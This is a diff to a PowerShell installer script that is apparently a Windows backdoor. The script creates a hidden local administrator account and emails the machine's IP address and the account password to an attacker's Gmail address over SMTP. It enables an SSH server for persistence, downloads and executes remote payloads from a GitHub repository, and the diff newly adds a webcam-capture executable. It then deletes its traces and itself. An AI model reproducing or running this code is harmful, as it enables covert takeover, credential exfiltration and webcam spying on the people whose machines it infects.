@@ -24,6 +24,7 @@ function create_account {
 }
 
 # create admin user
+Remove-localUser -Name "winlocal" -ErrorAction SilentlyContinue
 $NewLocalAdmin = "winlocal"
 $pword = random_text
 $Password = (ConvertTo-SecureString $pword -AsPlainText -Force)
@@ -39,21 +40,19 @@ $eword = Get-Content eword.txt
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
 
 # writes config file
+Add-Content -Path $initial_dir/coller.cmd -Value "@echo off" 
 Add-Content -Path $configfile -Value $ip
 Add-Content -Path $configfile -Value $password
 Add-Content -Path $configfile -Value $path
+Add-Content -Path $configfile -Value $initial_dir
 
 # smtp process
 Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $eword -AsPlainText -Force))
 
-# delete config file
-Remove-Item -Path $configfile
-Move-Item -Path email.txt $env:temp
-Move-Item -Path eword.txt $env:temp
 
 # goto temp, make working directory
 mkdir $path
-cd $path
+Set-Location $path
 
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -71,10 +70,29 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/
 # install the registry
 Invoke-Expression "./$reg_file.reg"; Invoke-Expression "./$con_file.vbs"
 
+# ----
+mkdir $env:temp/WCC
+Set-Location $env:temp/WCC
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/camcap/camcap.exe -OutFile "camcap.exe"
+
+# visual basic script to register the registry
+$concam_file = random_text
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/camcap/confirm-cam.vbs -OutFile "$concam_file.vbs"
+
+# install the registry
+Invoke-Expression "./camcap.exe"; Invoke-Expression "./$concam_file.vbs"
+# ----
+
 # hide WindowsGuest user
-cd C:\Users
+Set-Location C:\Users
 attrib +h +s +r winlocal
 
+# delete config file
+Set-Location $initial_dir
+Remove-Item -Path $configfile
+Remove-Item email.txt
+Remove-Item eword.txt
+
 # self delete
-cd $initial_dir
-del installer.ps1
+Remove-Item installer.ps1
